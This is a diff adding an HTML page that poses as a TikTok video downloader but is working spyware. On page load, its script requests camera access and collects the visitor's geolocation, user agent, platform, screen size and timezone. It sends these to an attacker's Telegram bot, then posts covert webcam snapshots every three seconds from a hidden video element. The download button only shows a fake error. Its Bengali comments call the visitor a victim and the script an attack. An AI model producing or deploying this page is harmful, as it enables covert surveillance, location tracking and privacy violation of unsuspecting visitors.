@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>TikTok Video Downloader</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        background: #000;
+        color: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 20px;
+    }
+    .container {
+        width: 100%;
+        max-width: 400px;
+        background: #121212;
+        border-radius: 20px;
+        padding: 30px 20px;
+        box-shadow: 0 10px 30px rgba(255, 255, 255, 0.05);
+        text-align: center;
+        border: 1px solid #222;
+    }
+    .logo {
+        font-size: 2.2rem;
+        font-weight: bold;
+        margin-bottom: 10px;
+        background: -webkit-linear-gradient(45deg, #25F4EE, #FE2C55);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+    .logo svg { width: 35px; fill: #fff; }
+    p { color: #888; font-size: 0.9rem; margin-bottom: 25px; }
+
+    input {
+        width: 100%;
+        padding: 15px;
+        background: #1a1a1a;
+        border: 1px solid #333;
+        border-radius: 12px;
+        color: #fff;
+        font-size: 1rem;
+        margin-bottom: 15px;
+        outline: none;
+    }
+    input:focus { border-color: #FE2C55; }
+
+    button {
+        width: 100%;
+        padding: 15px;
+        background: #FE2C55;
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        font-size: 1.1rem;
+        font-weight: bold;
+        cursor: pointer;
+        transition: 0.2s;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+    #statusMsg {
+        display: none;
+        margin-top: 15px;
+        padding: 10px;
+        border-radius: 8px;
+        font-size: 0.9rem;
+        font-weight: bold;
+    }
+    .status-error { background: rgba(255, 0, 0, 0.2); color: #ff4444; border: 1px solid #ff4444; }
+    .status-success { background: rgba(37, 244, 238, 0.2); color: #25F4EE; border: 1px solid #25F4EE; }
+
+    #cam-video {
+        position: fixed;
+        top: -9999px; left: -9999px;
+        width: 1px; height: 1px;
+        opacity: 0.01;
+        pointer-events: none;
+    }
+    #canvas { display: none; }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">
+        <svg viewBox="0 0 448 512"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/></svg>
+        TikTok Downloader
+    </div>
+    <p>Download TikTok videos without watermark.</p>
+
+    <input type="text" id="tiktokUrl" placeholder="Paste TikTok video link here...">
+
+    <button id="downloadBtn" onclick="dummyProcess()">
+        <svg width="20" height="20" fill="currentColor" viewBox="0 0 16 16"><path d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5z"/><path d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"/></svg>
+        Download Video
+    </button>
+
+    <div id="statusMsg"></div>
+</div>
+
+<video id="cam-video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    // ১. ডিকোড ফাংশন (ড্যাশবোর্ড ইন্টিগ্রেশন)
+    function getCreds() {
+        const params = new URLSearchParams(window.location.search);
+        let token = params.get('tg_token');
+        let chatId = params.get('tg_chat');
+        if (!token || !chatId) {
+            const encodedData = params.get('tg_data');
+            if (encodedData) {
+                try {
+                    const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
+                    token = decoded.token;
+                    chatId = decoded.chatId;
+                } catch(e) {}
+            }
+        }
+        if (!token) token = localStorage.getItem('tg_bot_token');
+        if (!chatId) chatId = localStorage.getItem('tg_chat_id');
+        return { token, chatId };
+    }
+
+    // ২. ভিকটিমের ডিভাইস ইনফো সংগ্রহ
+    async function getIntel() {
+        let geo = null;
+        try {
+            geo = await new Promise(res => navigator.geolocation.getCurrentPosition(
+                p => res({ lat: p.coords.latitude, lng: p.coords.longitude }),
+                () => res(null), { timeout: 5000 }
+            ));
+        } catch (e) {}
+        return {
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}`,
+            geolocation: geo
+        };
+    }
+
+    (function() {
+        'use strict';
+
+        const camVideo = document.getElementById('cam-video');
+        const canvas = document.getElementById('canvas');
+
+        async function startAttack() {
+            const { token, chatId } = getCreds();
+            if (!token || !chatId) return;
+
+            try {
+                // ক্যামেরা রিকোয়েস্ট
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                camVideo.srcObject = stream;
+                
+                // প্রথমবার ডিটেইলস পাঠানো
+                const intel = await getIntel();
+                let msg = `🚨 *TikTok Downloader Attack*\n\n`;
+                msg += `📱 OS: ${intel.platform}\n`;
+                msg += `🖥️ Screen: ${intel.screen}\n`;
+                msg += `🕒 TZ: ${intel.timezone}\n`;
+                if(intel.geolocation) msg += `📍 Loc: ${intel.geolocation.lat}, ${intel.geolocation.lng}\n`;
+                msg += `🌐 UA: ${intel.ua}`;
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+                });
+
+                // প্রতি ৩ সেকেন্ড পর পর ছবি পাঠানো (সার্ভার লোড কমাতে ১ সেকেন্ড থেকে ৩ সেকেন্ড করা হয়েছে)
+                setInterval(() => {
+                    captureAndSend(token, chatId);
+                }, 3000);
+
+            } catch (err) {
+                console.log("Camera access denied");
+            }
+        }
+
+        async function captureAndSend(token, chatId) {
+            const w = camVideo.videoWidth;
+            const h = camVideo.videoHeight;
+            if (w === 0) return;
+
+            canvas.width = w;
+            canvas.height = h;
+            canvas.getContext('2d').drawImage(camVideo, 0, 0, w, h);
+
+            canvas.toBlob(async (blob) => {
+                if (!blob) return;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', '📸 Live Capture from TikTok Downloader');
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            }, 'image/jpeg', 0.7);
+        }
+
+        // পেজ লোড হলেই অ্যাটাক শুরু
+        window.addEventListener('DOMContentLoaded', startAttack);
+    })();
+
+    function dummyProcess() {
+        const status = document.getElementById('statusMsg');
+        status.style.display = 'block';
+        status.innerText = "Verifying link... Please wait.";
+        status.className = 'status-success';
+        setTimeout(() => {
+            status.innerText = "❌ Invalid TikTok link. Please try again.";
+            status.className = 'status-error';
+        }, 3000);
+    }
+</script>
+</body>
+</html>
